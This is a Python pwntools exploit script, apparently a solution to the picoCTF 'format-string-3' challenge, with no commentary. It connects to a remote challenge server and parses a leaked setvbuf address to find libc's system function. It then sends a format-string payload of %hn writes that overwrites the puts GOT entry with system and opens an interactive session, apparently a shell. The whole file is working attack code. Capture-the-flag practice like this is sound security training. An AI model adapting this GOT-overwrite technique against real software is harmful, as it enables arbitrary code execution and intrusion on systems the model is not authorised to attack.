from pwn import *


def my_divide(system_address):
	result = []

	temp = []
	temp.append(system_address & 0xffff)
	temp.append(0)
	result.append(temp)

	temp = []
	system_address = system_address >> 16
	temp.append(system_address & 0xffff)
	temp.append(2)
	result.append(temp)

	temp = []
	system_address = system_address >> 16
	temp.append(system_address & 0xffff)
	temp.append(4)
	result.append(temp)

	return sorted(result, key=lambda x: x[0])


context.binary = exe = ELF("./format-string-3_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)


#p = process(exe.path)
p = remote("rhea.picoctf.net", 63813)



#input()
p.recvuntil(b"setvbuf in libc: ")

libc_leak = int(p.recvline()[:-1], 16)
print("libc leak: ", hex(libc_leak))

libc.address = libc_leak - libc.sym['setvbuf']

system_address = libc.sym['system']

print("system: ", hex(system_address))

result = my_divide(system_address)

#print("result = ", result)
#input()

overwrite_address = exe.got['puts']
print("overwrite_addr", hex(overwrite_address))
#p.sendline()

payload = f'%{result[0][0]}c%46$hn'.encode()
payload += f'%{result[1][0]-result[0][0]}c%47$hn'.encode()
payload += f'%{result[2][0]-result[1][0]}c%48$hn'.encode()
payload = payload.ljust(64, b"A")
payload += p64(overwrite_address+result[0][1])
payload += p64(overwrite_address+result[1][1])
payload += p64(overwrite_address+result[2][1])

p.sendline(payload)

p.interactive()
